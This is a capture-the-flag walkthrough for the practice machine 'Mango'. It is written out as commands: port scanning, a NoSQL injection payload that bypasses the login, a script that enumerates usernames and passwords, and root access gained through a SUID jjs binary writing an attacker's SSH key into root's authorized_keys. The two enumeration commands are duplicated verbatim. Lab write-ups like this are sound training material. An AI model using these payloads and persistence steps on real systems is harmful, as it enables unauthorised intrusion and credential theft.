## Mango

Difficulty: Medium

### User Flag

```
rustscan -a mango.htb --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/e5142ad3-f0d3-4d4a-81a1-e38771b1aac6)

<br>

In the certificate of HTTPS we can enumerate a subdomain: staging-order.mango.htb

![certificcate](https://github.com/b1d0ws/OSCP/assets/58514930/54ce2073-875d-4df8-9423-8ff143eb36d0)

<br>

The website presents a login form that can be bypassed with NoSQL Injection.

```
username=admin&password[$ne]=admin&login=login
```

![website](https://github.com/b1d0ws/OSCP/assets/58514930/d5617d97-b0f3-45da-a265-faaf25e46b4e)

![loginBypass](https://github.com/b1d0ws/OSCP/assets/58514930/e9d93826-6238-4d8d-840a-82671b9dc38a)

<br>

We can enumerate users and password with [this script](https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration/tree/master) and login as user Mango with the first password in SSH.

```
python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -op login=login -m POST

python3 nosqli-user-pass-enum.py -u http://staging-order.mango.htb -up username -pp password -ep username -op login=login -m POST
```

![usernameEnumeration](https://github.com/b1d0ws/OSCP/assets/58514930/241c94db-e782-4fbd-8869-91c317e10d35)

![passwordEnum](https://github.com/b1d0ws/OSCP/assets/58514930/8454cefd-cfca-4811-8c75-a5c160e0852b)

<br>

### Root Flag

Enumerating SUID Bits, we find jjs that can be used to write files. Use this to write your own SSH Key on root directory.  

You have to belong to group admin, so we need to login as admin user with the other password found.

```
find / -type f -perm -04000 -ls 2>/dev/null

ssh-keygen -t rsa -f mango

echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorized_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0aaxVcmz18LQ7Us2a6OHFd42CLvO08ULwGclvksx+4StsaW9UsDJUG1Rn+EPji11+Ye8FF/osno6fysA3GI8IxOi6/ZE54Qp9LedHyPvjKta70Ju0J+C1Euvx/ylK5DKpzNmPg8a7lRhjqY71hDmfIU7HaPe6oJ7WnYHKzLRDieJSgG0nO34VE5dKZtvE5pTQJGwggAAPLREVarOYCVo1gqQwP+dbPMoJmO6yaHOr0ShDL3M4J8sgFSd6hGJgGzG7PrzseuUS7VcUMAOH2lNDGMqe/Di5KV7ZGjejvNJZ9OQYXx0R4AXXG5nO6+MVxoVaeODapig/jFSx/0WBoo+zR9EgJKQR7vgr0GRclTT4e9ePhXWRLPRAVraaIcxAHleT35gm5EDtRqK7tndwdpGaof8nVoQnhfY+8axoz35kNsEugTzjyJcSd307JI5ndDrx1snx+xD8FpXKAigEo2x7hAQpW/gZ7O1sCvQXdSKiOdNz/SOuuIqP+IIERw+olFU= kali@kali");
fw.close();' | jjs
```

![suidEnumeration](https://github.com/b1d0ws/OSCP/assets/58514930/b3313665-3e19-4027-abb7-b3fe44e3838b)

![privEsc](https://github.com/b1d0ws/OSCP/assets/58514930/5aaf0d95-fa2f-4bdb-bc15-a6885da7e975)
